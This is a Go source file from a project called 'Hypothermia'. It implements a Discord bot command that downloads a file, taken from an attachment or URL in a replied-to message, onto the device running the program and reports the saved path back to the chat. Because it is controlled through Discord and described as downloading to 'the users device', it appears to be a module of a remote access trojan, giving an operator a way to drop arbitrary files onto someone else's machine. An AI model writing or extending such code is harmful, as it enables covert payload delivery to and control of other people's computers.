package commands

import (
	"Hypothermia/src/utils"
	"fmt"
	"strings"

	"github.com/bwmarrin/discordgo"
)

const (
	dwNoFileError string = "🟥 You need reply to a file or a file url."
	dwSuccess     string = "🟩 Successfully downloaded file to: "
)

func (*DownloadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if m.MessageReference == nil {
		s.ChannelMessageSendReply(m.ChannelID, dwNoFileError, m.Reference())
		return
	}

	var fileURL string
	msg, _ := s.ChannelMessage(m.MessageReference.ChannelID, m.MessageReference.MessageID)

	if len(msg.Attachments) > 0 {
		fileURL = msg.Attachments[0].URL
	}

	if fileURL == "" {
		words := strings.Fields(msg.Content)
		for _, word := range words {
			if strings.HasPrefix(word, "http://") || strings.HasPrefix(word, "https://") {
				fileURL = word
				break
			}
		}
	}

	if fileURL == "" {
		s.ChannelMessageSendReply(m.ChannelID, dwNoFileError, m.Reference())
		return
	}

	path, err := utils.DonwloadFile(fileURL)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(dwSuccess, path), m.Reference())
}

func (*DownloadCommand) Name() string {
	return "download"
}

func (*DownloadCommand) Info() string {
	return "downloads a file to the users device"
}

type DownloadCommand struct{}
